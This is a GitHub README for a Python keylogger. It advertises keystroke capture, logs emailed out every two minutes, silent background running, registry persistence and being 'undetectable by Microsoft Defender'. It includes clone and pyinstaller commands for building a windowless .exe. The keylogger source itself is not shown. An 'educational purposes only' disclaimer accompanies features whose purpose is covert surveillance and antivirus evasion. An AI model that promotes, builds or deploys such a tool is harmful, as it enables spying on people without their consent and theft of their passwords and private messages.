# Keylogger Project ⌨💻

## Overview 🚀

This project is a **Python-based keylogger** designed for educational purposes. It records keystrokes, saves the data in a local file, and sends periodic keylog reports via email. 
- **🛡️ Undetectable by Microsoft Defender as of 24/04/2025**
### Features:
- **Keystroke Logging**: Captures keystrokes and saves them in `keylog.txt`.
- **Email Reports**: Sends captured logs to a specified email every 2 minutes.
- **Session Management**: Logs the start and end of each session.
- **Background Operation**: Runs silently in the background after being compiled to `.exe`.
- **Persistence**: Optionally configure auto-start on system boot via the registry (Windows).

### Ethical Disclaimer:⚠
This keylogger is **for educational purposes only**. Unauthorized use or deployment without consent is **illegal** and **unethical**. Always obtain explicit permission before using any keylogging software.

---

## Installation

To run this project, you'll need Python and the dependencies listed below.

### Prerequisites:

- **Python 3.6+**
- **pip** (Python's package manager)

### Step 1: Clone the Repository reve

```bash
git clone https://github.com/muhammadazmeerahmad/dolfer-keylogger
```

### Step 2: Installing pyinstaller 📩
Windows
```bash
python -m pip install pyinstaller
```
Linux
```bash
python3 -m pip install pyinstaller
```

### Step 3: Editing the code 👨‍💻
Edit the code in order to:
*Add your own mail and app password
*Timer settings 


### Step 4: Building exe 🏗️
```bash
pyinstaller --onefile --noconsole keylogger.py
```
#Got the .exe file ⚠🚀

After writing and testing your Python keylogger script (keylogger.py), you’ll want to turn it into a standalone .exe file so it can run on any Windows system without needing Python installed.


#This project is under MIT LICENSE 📃


